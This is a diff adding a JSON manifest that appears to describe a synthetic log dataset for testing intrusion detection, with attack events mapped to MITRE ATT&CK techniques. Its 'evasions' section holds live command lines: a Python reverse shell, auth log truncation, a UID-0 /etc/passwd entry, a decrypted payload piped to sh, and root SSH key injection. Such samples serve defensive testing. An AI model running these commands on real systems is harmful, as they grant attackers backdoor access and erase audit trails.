@@ -1,0 +1,131 @@
+{
+  "generated": "2026-10-19T08:37:37+00:00",
+  "benign": 600,
+  "attack_events": 18,
+  "evasion_events": 6,
+  "techniques": [
+    {
+      "technique": "T1110",
+      "name": "ssh brute force",
+      "ts": "2026-10-19T08:41:07+00:00",
+      "window_end": "2026-10-19T08:41:57+00:00",
+      "events": 6
+    },
+    {
+      "technique": "T1078",
+      "name": "successful login after failures",
+      "ts": "2026-10-19T08:42:37+00:00",
+      "window_end": "2026-10-19T08:43:07+00:00",
+      "events": 1
+    },
+    {
+      "technique": "T1136.001",
+      "name": "local account creation",
+      "ts": "2026-10-19T08:44:07+00:00",
+      "window_end": "2026-10-19T08:44:37+00:00",
+      "events": 1
+    },
+    {
+      "technique": "T1098.004",
+      "name": "ssh key injection",
+      "ts": "2026-10-19T08:45:37+00:00",
+      "window_end": "2026-10-19T08:46:07+00:00",
+      "events": 1
+    },
+    {
+      "technique": "T1053.003",
+      "name": "cron persistence",
+      "ts": "2026-10-19T08:47:07+00:00",
+      "window_end": "2026-10-19T08:47:37+00:00",
+      "events": 1
+    },
+    {
+      "technique": "T1059.004",
+      "name": "reverse shell",
+      "ts": "2026-10-19T08:48:37+00:00",
+      "window_end": "2026-10-19T08:49:07+00:00",
+      "events": 1
+    },
+    {
+      "technique": "T1140",
+      "name": "encoded payload execution",
+      "ts": "2026-10-19T08:50:07+00:00",
+      "window_end": "2026-10-19T08:50:37+00:00",
+      "events": 1
+    },
+    {
+      "technique": "T1070.002",
+      "name": "log tampering",
+      "ts": "2026-10-19T08:51:37+00:00",
+      "window_end": "2026-10-19T08:52:07+00:00",
+      "events": 1
+    },
+    {
+      "technique": "T1548.003",
+      "name": "sudoers modification",
+      "ts": "2026-10-19T08:53:07+00:00",
+      "window_end": "2026-10-19T08:53:37+00:00",
+      "events": 1
+    },
+    {
+      "technique": "T1003.008",
+      "name": "credential access",
+      "ts": "2026-10-19T08:54:37+00:00",
+      "window_end": "2026-10-19T08:55:07+00:00",
+      "events": 1
+    },
+    {
+      "technique": "T1190",
+      "name": "web exploitation attempt",
+      "ts": "2026-10-19T08:56:07+00:00",
+      "window_end": "2026-10-19T08:56:37+00:00",
+      "events": 1
+    },
+    {
+      "technique": "T1105",
+      "name": "download and execute",
+      "ts": "2026-10-19T08:57:37+00:00",
+      "window_end": "2026-10-19T08:58:07+00:00",
+      "events": 1
+    },
+    {
+      "technique": "T1560",
+      "name": "archive staging",
+      "ts": "2026-10-19T08:59:07+00:00",
+      "window_end": "2026-10-19T08:59:37+00:00",
+      "events": 1
+    }
+  ],
+  "evasions": [
+    {
+      "technique": "T1059.004",
+      "name": "python reverse shell",
+      "cmdline": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"203.0.113.9\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    },
+    {
+      "technique": "T1070.002",
+      "name": "in-place log truncation",
+      "cmdline": ": > /var/log/auth.log"
+    },
+    {
+      "technique": "T1136.001",
+      "name": "direct /etc/passwd edit",
+      "cmdline": "echo 'svcbackup:x:0:0::/root:/bin/bash' >> /etc/passwd"
+    },
+    {
+      "technique": "T1053.003",
+      "name": "systemd timer persistence",
+      "cmdline": "systemctl enable --now evil.timer"
+    },
+    {
+      "technique": "T1140",
+      "name": "openssl-decoded payload",
+      "cmdline": "openssl enc -d -aes-256-cbc -in /tmp/p.enc | sh"
+    },
+    {
+      "technique": "T1098.004",
+      "name": "key installed via python",
+      "cmdline": "python3 -c \"open('/root/.ssh/authorized_keys','a').write('ssh-ed25519 AAA')\""
+    }
+  ]
+}
